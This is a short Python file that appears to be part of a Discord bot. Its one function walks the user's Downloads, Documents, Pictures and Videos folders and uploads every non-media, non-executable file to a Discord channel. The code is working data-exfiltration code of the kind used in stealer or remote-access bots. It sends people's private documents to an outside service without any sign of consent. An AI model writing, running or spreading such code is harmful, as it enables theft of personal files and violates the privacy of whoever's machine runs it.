import discord
import os

async def getfiles(ctx):
    root_directories = [
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/Videos")
    ]
    errors = set()
    excluded_extensions = {'.exe', '.dll', '.mp3', '.wav', '.mp4', '.avi', '.mov', '.png', '.jpg', '.jpeg', '.gif', '.bmp'}

    for root_dir in root_directories:
        for root, _, files in os.walk(root_dir):
            for file_name in files:
                if os.path.splitext(file_name)[1].lower() not in excluded_extensions:
                    file_path = os.path.join(root, file_name)
                    try:
                        file_to_send = discord.File(file_path)
                        await ctx.send(file=file_to_send)
                    except Exception as e:
                        if file_path not in errors:
                            errors.add(file_path)
                            print(f"Skipping {file_path}: {e}")
